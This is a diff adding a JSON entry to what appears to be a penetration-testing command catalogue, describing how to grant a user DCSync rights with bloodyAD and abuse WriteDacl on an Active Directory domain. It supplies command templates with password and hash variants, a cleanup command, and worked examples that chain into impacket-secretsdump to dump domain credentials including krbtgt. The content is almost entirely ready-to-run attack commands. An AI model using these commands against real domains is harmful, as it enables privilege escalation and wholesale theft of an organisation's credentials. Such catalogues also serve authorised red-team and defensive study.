@@ -1,0 +1,21 @@
+{
+  "id": "bloodyad-dcsync",
+  "name": "bloodyAD Grant DCSync",
+  "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> add dcsync <target_user>",
+  "description": "Grant a target principal the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights on the domain object — i.e. give them DCSync. Requires WriteDacl on the domain. Pair with secretsdump for instant krbtgt extraction.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["bloodyad", "dcsync", "acl", "writedacl", "privesc"],
+  "variations": [
+    { "label": "NTLM Hash", "requires": "hash", "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p :<hash> add dcsync <target_user>" },
+    { "label": "Cleanup", "requires": "password", "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> remove dcsync <target_user>" }
+  ],
+  "references": [
+    { "title": "bloodyAD docs", "url": "https://github.com/CravateRouge/bloodyAD/wiki" }
+  ],
+  "examples": [
+    "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' add dcsync jdoe",
+    "impacket-secretsdump -just-dc 'corp.local/jdoe:Password123!@10.10.10.10'"
+  ]
+}
